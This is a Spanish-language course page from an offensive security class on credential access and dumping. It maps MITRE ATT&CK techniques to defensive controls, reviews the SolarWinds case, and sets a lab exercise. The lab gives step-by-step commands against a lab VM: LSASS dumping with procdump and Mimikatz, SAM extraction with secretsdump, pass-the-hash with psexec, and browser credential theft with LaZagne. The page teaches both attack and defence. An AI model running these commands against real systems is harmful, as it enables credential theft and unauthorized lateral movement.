# Semana 14: Acceso a credenciales y volcado

Curso: [Ciberseguridad Ofensiva: Pensar como Atacante](../syllabus.md) · Semana 14 de 20

## Objetivo de la semana
Comprender las técnicas que los atacantes utilizan para obtener, extraer y reutilizar credenciales almacenadas en sistemas operativos, navegadores y gestores de secretos. El estudiante aprenderá a identificar ubicaciones de credenciales en memoria y disco, aplicar herramientas de volcado (Mimikatz, secretsdump, LaZagne) y mapear estas acciones contra MITRE ATT&CK (TA0006 Credential Access) y controles defensivos como CIS Controls v8 y NIST SP 800-53.

## LECTURA
El acceso a credenciales y su volcado constituyen una de las fases más críticas de una intrusión, ubicada en la táctica **TA0006 – Credential Access** del framework **MITRE ATT&CK**. Una vez que un atacante obtiene ejecución inicial, el siguiente paso suele ser escalar privilegios y moverse lateralmente, y para ello necesita credenciales válidas. Las técnicas más relevantes incluyen **T1003 (OS Credential Dumping)**, con sub-técnicas como T1003.001 (LSASS Memory), T1003.002 (Security Account Manager), T1003.003 (NTDS.dit), T1003.004 (LSA Secrets) y T1003.005 (Cached Domain Credentials). En Windows, las credenciales en texto claro o hashes NTLM pueden residir en la memoria del proceso `lsass.exe`; herramientas como **Mimikatz** (módulo `sekurlsa::logonpasswords`) o `procdump` combinado con Mimikatz permiten extraerlas. En Linux, los objetivos habituales son `/etc/shadow`, los keyrings de GNOME/KDE, los archivos `~/.ssh/id_rsa`, los historiales de shell y las variables de entorno. En navegadores y gestores, herramientas como **LaZagne** o **SharpChromium** extraen cookies, contraseñas guardadas y tokens de sesión de Chrome, Firefox, Edge y aplicaciones como Outlook o WinSCP.

El **OWASP Top 10** aborda este riesgo principalmente en **A02:2021 – Cryptographic Failures** y **A07:2021 – Identification and Authentication Failures**, ya que el almacenamiento débil de secretos y la falta de MFA facilitan el reaprovechamiento de credenciales. **NIST SP 800-63B** recomienda no almacenar contraseñas en texto claro y aplicar hashing con sal (bcrypt, Argon2, PBKDF2). **CIS Controls v8** cubre el tema en el Control 5 (Account Management) y Control 6 (Access Control Management), mientras que **NIST SP 800-53 Rev.5** lo trata en IA-5 (Authenticator Management) y SI-7 (Software, Firmware, and Information Integrity). **ISO/IEC 27001:2022** lo aborda en el Anexo A, controles 5.15 (Access control), 8.5 (Secure authentication) y 8.24 (Use of cryptography).

Defensivamente, las mitigaciones incluyen habilitar **LSA Protection (RunAsPPL)**, **Credential Guard**, deshabilitar el almacenamiento de credenciales en caché, aplicar **Windows Defender Credential Guard**, monitorizar accesos a `lsass.exe` (Event ID 4656, 4663, 10 de Sysmon), restringir SeDebugPrivilege y usar EDR con detección de comportamiento. En entornos Linux, se recomienda `pam_unix` con yescrypt, permisos 600 en `~/.ssh`, uso de `ssh-agent` con confirmación, y gestores como `pass` o `gopass`. En el ámbito ofensivo, frameworks como **Impacket** (`secretsdump.py`), **CrackMapExec**, **Rubeus** (para tickets Kerberos) y **BloodHound** (para identificar rutas hacia cuentas con privilegios) son estándar en un pentest profesional, siempre bajo un alcance y contrato firmado.

## EJERCICIO
**Objetivo:** Extraer credenciales de una máquina Windows 10 víctima en un laboratorio controlado, validar su reutilización y proponer mitigaciones.

**Entorno:** Máquina atacante Kali Linux (192.168.56.10) y víctima Windows 10 (192.168.56.20) en red host-only. Usuario local `labuser` con contraseña conocida.

**Pasos:**
1. **Reconocimiento:** Desde Kali, ejecutar `nmap -sV -p 445,3389,5985 192.168.56.20` para identificar servicios expuestos.
2. **Acceso inicial simulado:** Usar `crackmapexec smb 192.168.56.20 -u labuser -p 'Password123!'` para validar credenciales.
3. **Volcado remoto de SAM:** Ejecutar `impacket-secretsdump labuser:'Password123!'@192.168.56.20` y guardar la salida en `hashes.txt`.
4. **Volcado local de LSASS:** En la víctima, como administrador, ejecutar `procdump.exe -accepteula -ma lsass.exe lsass.dmp` y transferir el dump a Kali con `impacket-smbserver`.
5. **Extracción con Mimikatz:** En Kali con Wine o en un Windows de análisis, ejecutar `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"` y documentar hashes NTLM obtenidos.
6. **Reutilización (Pass-the-Hash):** Con `impacket-psexec -hashes <LM>:<NT> administrator@192.168.56.20` verificar acceso sin contraseña en claro.
7. **Extracción de navegador:** Ejecutar `lazagne.exe browsers` en la víctima y comparar credenciales recuperadas.
8. **Mitigación:** Habilitar `RunAsPPL` vía registro (`reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1`), reiniciar y repetir el paso 4 para comprobar que el dump falla o queda inutilizable.
9. **Informe:** Documentar hallazgos mapeando cada acción a MITRE ATT&CK (T1003.001, T1003.002) y proponer controles CIS v8 (5.4, 6.8).

## CASO
**Caso real: Ataque a SolarWinds (2020) y el robo de credenciales en cadena.** Aunque el vector inicial fue un supply chain attack mediante la actualización troyanizada de Orion, los atacantes (APT29/Cozy Bear) emplearon técnicas de **Credential Access** para moverse lateralmente en las redes de las víctimas. Tras obtener ejecución en los servidores Orion, utilizaron herramientas como **Mimikatz** y volcado de SAM para extraer hashes NTLM y tickets Kerberos, permitiéndoles impersonar cuentas con privilegios y acceder a correos y documentos en entornos Microsoft 365. La táctica clave fue T1003.001 (LSASS Memory) combinada con T1550.002 (Pass the Hash) y T1550.003 (Pass the Ticket). El caso evidenció que incluso con MFA en el perímetro, el robo de tokens y credenciales internas permite saltarse controles. Como respuesta, CISA emitió la directiva ED 21-01 y NIST actualizó guías sobre monitorización de LSASS. Las lecciones aprendidas incluyen: habilitar Credential Guard, segmentar redes, aplicar principio de mínimo privilegio, monitorizar Sysmon Event ID 10 y auditar accesos a `lsass.exe` con reglas Sigma.

## Recursos abiertos
- https://attack.mitre.org/tactics/TA0006/
- https://github.com/gentilkiwi/mimikatz
- https://github.com/AlessandroZ/LaZagne
- https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a
- https://www.cisecurity.org/controls/v8

--- [Volver al syllabus](../syllabus.md)
